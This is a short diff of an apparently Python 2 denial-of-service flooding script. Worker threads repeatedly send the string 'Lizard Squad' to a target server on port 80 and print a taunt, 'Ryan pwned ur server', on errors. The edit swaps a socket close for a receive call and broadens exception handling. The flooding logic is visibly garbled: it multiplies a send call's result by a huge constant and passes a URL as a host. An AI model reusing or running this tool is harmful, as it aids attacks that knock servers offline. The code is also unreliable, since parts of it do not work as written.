@@ -84,7 +84,7 @@ def httpcall(url):
 	try:
 		
 			s.sendto("Lizard Squad", (url,80)) * 109951162777600
-			s.close()
+			s.recv(1024)
 	except socket.error as e:
 			#print e.code
 			print 'Ryan pwned ur server'
@@ -96,9 +96,9 @@ class HTTPThread(threading.Thread):
 	def run(self):
 		try:
 			while True:
-				code=httpcall(url)				
+				httpcall(url)				
 					
-		except Exception, ex:
+		except:
 			pass
 		
 if len(sys.argv) < 2:
